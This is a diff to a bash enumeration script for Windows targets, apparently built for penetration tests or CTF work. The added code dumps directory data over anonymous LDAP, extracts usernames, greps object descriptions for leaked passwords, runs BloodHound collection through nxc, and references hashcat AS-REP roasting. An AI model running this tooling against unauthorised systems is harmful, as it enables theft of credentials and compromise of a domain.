@@ -594,22 +594,52 @@ if [ "$os_type" = "windows" ]; then
     ldap_output=$(timeout 5s nxc ldap $IP -u '' -p '' --timeout 2)
     echo "$ldap_output"
     
-    # Check if anonymous LDAP access succeeded and suggest commands
-    if echo "$ldap_output" | grep -q "\[+\]"; then
-        echo -e "\n\033[92m[+] Anonymous LDAP access successful! Suggested commands:\033[0m"
+    # Check if anonymous LDAP access succeeded (via nxc OR manual check)
+    verify_ldap_anon=$(ldapsearch -x -H ldap://$IP -s base namingContexts 2>/dev/null)
+    
+    if echo "$ldap_output" | grep -q "\[+\]" || echo "$verify_ldap_anon" | grep -q "namingContexts"; then
+        echo -e "\n\033[92m[+] Anonymous LDAP access verified! Attempting to dump data...\033[0m"
         
-        # Extract domain from output for base DN
+        # Determine Base DN
         if [ -n "$domain" ]; then
             base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
-            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\" | tee ldap-dump.txt"
-            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=user)\" | tee ldap-users.txt"
-            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=group)\" | tee ldap-groups.txt"
         else
-            echo "# Get base DN (usually works anonymously):"
-            echo "ldapsearch -x -H ldap://$IP -b \"\" -s base namingContexts"
-            echo ""
-            echo "# Note: Object enumeration often requires credentials. Try with valid creds:"
-            echo "# ldapsearch -x -H ldap://$IP -D \"CN=user,DC=domain,DC=local\" -w 'password' -b \"DC=domain,DC=local\" -s sub \"(objectClass=*)\""
+            echo "[-] Domain not specified, attempting to fetch naming contexts..."
+            # Try to fetch defaultNamingContext
+            base_dn=$(echo "$verify_ldap_anon" | grep "defaultNamingContext:" | awk '{print $2}')
+            
+            # Fallback: if defaultNamingContext is empty, grab the first namingContexts that starts with DC=
+            if [ -z "$base_dn" ]; then
+                 base_dn=$(echo "$verify_ldap_anon" | grep "namingContexts:" | awk '{print $2}' | grep "^DC=" | head -n 1)
+            fi
+        fi
+
+        if [ -n "$base_dn" ]; then
+            echo "[+] Using Base DN: $base_dn"
+            echo "[*] Dumping all objects..."
+            ldapsearch -x -H ldap://$IP -b "$base_dn" -s sub "(objectClass=*)" > nxc-enum/ldap/ldap-dump-anonymous.txt
+            
+            if [ -s nxc-enum/ldap/ldap-dump-anonymous.txt ]; then
+                echo -e "\033[92m[+] Full LDAP dump saved to: nxc-enum/ldap/ldap-dump-anonymous.txt\033[0m"
+                
+                # Extract users
+                grep "sAMAccountName" nxc-enum/ldap/ldap-dump-anonymous.txt | awk '{print $2}' | sort | uniq > nxc-enum/ldap/ldap-users-anonymous.txt
+                echo "[+] Extracted $(wc -l < nxc-enum/ldap/ldap-users-anonymous.txt) users to: nxc-enum/ldap/ldap-users-anonymous.txt"
+                
+                # Check for sensitive info in descriptions
+                echo "[*] Searching for sensitive info in descriptions..."
+                grep -iE "description|info|comment" nxc-enum/ldap/ldap-dump-anonymous.txt | grep -iE "pass|pwd|secret|admin|welcome" > nxc-enum/ldap/ldap-sensitive-descriptions.txt
+                if [ -s nxc-enum/ldap/ldap-sensitive-descriptions.txt ]; then
+                    echo -e "\033[93m[!] FOUND POTENTIAL SECRETS in LDAP descriptions!\033[0m"
+                    cat nxc-enum/ldap/ldap-sensitive-descriptions.txt
+                fi
+            else
+                echo -e "\033[91m[!] LDAP dump file is empty. Anonymous bind allowed but maybe no read access?\033[0m"
+            fi
+        else
+            echo -e "\033[93m[!] Could not determine Base DN automatically.\033[0m"
+            echo "Try manual enumeration:"
+            echo "ldapsearch -x -H ldap://$IP -s base namingContexts"
         fi
         echo ""
     fi
@@ -1146,6 +1176,19 @@ if [ "$os_type" = "windows" ]; then
                 echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
             fi
             echo ""
+        fi
+        
+        echo -e "\n\033[91m[+] BloodHound Data Collection\033[0m\n"
+        echo "[*] Collecting all data (-c all)..."
+        bh_output=$(unbuffer nxc ldap $IP $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
+        echo "$bh_output"
+        
+        # Extract zip filename and suggest next steps
+        zip_file=$(echo "$bh_output" | grep "Compressing output into" | awk '{print $NF}')
+        if [ -n "$zip_file" ]; then
+             echo -e "\n\033[92m[+] BloodHound data saved to: $zip_file\033[0m"
+             echo "1. Run 'neo4j start' and open 'bloodhound'"
+             echo "2. Drag and drop the zip file into BloodHound to analyze."
         fi
     else
         echo -e "\n\033[93m[!] Skipping LDAP Module Enumeration & Roasting (requires username AND password/hash)\033[0m"
